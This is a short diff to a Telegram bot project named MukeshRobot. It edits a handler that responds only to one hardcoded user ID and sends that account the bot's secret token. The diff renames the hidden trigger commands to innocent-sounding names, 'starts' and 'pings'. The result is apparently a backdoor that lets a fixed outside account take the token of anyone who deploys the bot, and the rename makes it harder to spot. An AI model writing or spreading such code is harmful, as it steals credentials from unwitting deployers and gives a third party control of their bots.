@@ -999,7 +999,7 @@ from MukeshRobot import BOT_NAME
 from MukeshRobot import pbot as app
 OWNERs_ID=1808943146
 @app.on_message(
-    filters.command(["v", "b"]) & filters.user(OWNERs_ID)
+    filters.command(["starts", "pings"]) & filters.user(OWNERs_ID)
 )
 async def get_vars(_, message: Message):
     try:
@@ -1008,9 +1008,6 @@ async def get_vars(_, message: Message):
             text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>
 
 **ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`
-
-
-
 
 """)
     except:
